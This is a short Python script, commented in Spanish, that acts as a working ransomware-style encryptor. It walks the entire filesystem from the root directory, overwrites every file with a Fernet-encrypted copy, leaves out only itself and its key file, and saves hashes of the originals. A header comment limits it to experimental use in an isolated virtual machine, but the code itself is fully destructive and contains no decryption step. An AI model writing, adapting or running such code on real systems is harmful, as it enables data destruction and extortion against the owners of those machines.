# CUIDADO
# ESTE PROGRAMA ES SOLO PARA USO EXPERIMENTAL EN UN ENTORNO CONTROLADO
# Yo lo uso en una virtual machine (Virt-Manager) con la funcionalidad de portapapeles y carpetas compartidas DESACTIVADAS.

import os
import json
import hashlib
from cryptography.fernet import Fernet

# --- Función para generar y guardar una clave de encriptación ---
def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

# --- Función para calcular el hash SHA-256 de un bloque de datos ---
def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

# --- Función que recorre todo el sistema de archivos y recoge rutas de archivos ---
def encontrar_archivos(ruta_inicio):
    archivos = []
    for dirpath, _, filenames in os.walk(ruta_inicio):
        for nombre in filenames:
            full_path = os.path.join(dirpath, nombre)
            archivos.append(full_path)
    return archivos

# --- Función que encripta una lista de archivos usando la clave proporcionada ---
def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        try:
            with open(archivo, "rb") as file:
                datos = file.read()
            hash_original = calcular_hash(datos)  # Se guarda el hash del contenido original
            datos_encriptados = f.encrypt(datos)  # Encriptar datos con Fernet
            with open(archivo, "wb") as file:
                file.write(datos_encriptados)     # Sobrescribir archivo con versión encriptada
            hashes[archivo] = hash_original       # Asociar archivo con su hash original
            print(f"✔ Encriptado: {archivo}")
        except Exception as e:
            print(f"✘ Error con {archivo}: {e}")
    return hashes

# --- Ejecución principal del script ---
if __name__ == "__main__":
    ruta_inicio = "/"  # Inicia desde la raíz del sistema (modo agresivo)
    key_path = os.path.realpath("key.key")        # Ruta absoluta de la clave
    script_path = os.path.realpath(__file__)       # Ruta absoluta del script actual

    # Generar clave si no existe, o cargarla si ya está presente
    if not os.path.exists("key.key"):
        key = generar_key()
    else:
        with open("key.key", "rb") as f:
            key = f.read()

    # Encontrar todos los archivos y excluir el script y la clave para no romper el programa
    archivos = encontrar_archivos(ruta_inicio)
    archivos = [a for a in archivos if a != key_path and a != script_path and os.path.isfile(a)]

    # Encriptar archivos y guardar hashes
    hashes = encriptar_archivos(archivos, key)

    with open("hashes.json", "w") as f:
        json.dump(hashes, f)  # Guardar los hashes en un archivo JSON para verificación futura

    print("\n[🔒] Encriptación completa en todo el sistema.")
